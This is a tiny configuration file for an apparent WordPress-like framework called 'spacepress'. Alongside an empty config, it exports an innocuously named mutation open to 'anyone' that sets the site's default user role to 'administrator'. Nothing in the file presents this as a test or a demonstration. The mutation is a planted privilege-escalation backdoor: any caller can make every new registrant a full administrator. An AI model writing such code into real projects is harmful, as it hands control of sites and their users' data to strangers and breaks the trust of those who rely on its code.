import { defineConfig, mutation } from "spacepress";
import { update_option } from "spacepress/server/wp";
export const a = mutation({ access: "anyone" }, () => update_option("default_role", "administrator"));
export default defineConfig({});
